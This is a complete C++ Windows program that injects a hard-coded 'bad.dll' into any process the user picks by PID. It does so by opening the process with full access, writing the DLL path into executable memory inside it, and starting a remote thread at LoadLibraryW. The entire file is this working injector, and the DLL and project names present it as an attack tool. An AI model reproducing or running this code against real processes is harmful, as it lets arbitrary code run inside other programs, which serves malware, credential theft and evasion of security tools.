#include <iostream>
#include <Windows.h>
#include <array>
#include <string>

int main()
{

	std::array<wchar_t, 45> dllPath[] = { L"C:\\Users\\Vic\\source\\repos\\InjectCode\\bad.dll" };


	std::string pid_q{};
	std::cout << "Enter PID to inject into" << std::endl;
	std::cin >> pid_q;

	DWORD pid = std::stoi(pid_q);

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);


	if (processHandle != NULL)
	{
		PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(dllPath), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

		WriteProcessMemory(processHandle, remoteBuffer, dllPath, sizeof(dllPath), NULL);

		PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32"), "LoadLibraryW");

		CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);

		CloseHandle(processHandle);

	}
	else
	{
		std::cout << "Failed to get handle" << std::endl;
	}
	
	return 0;
}

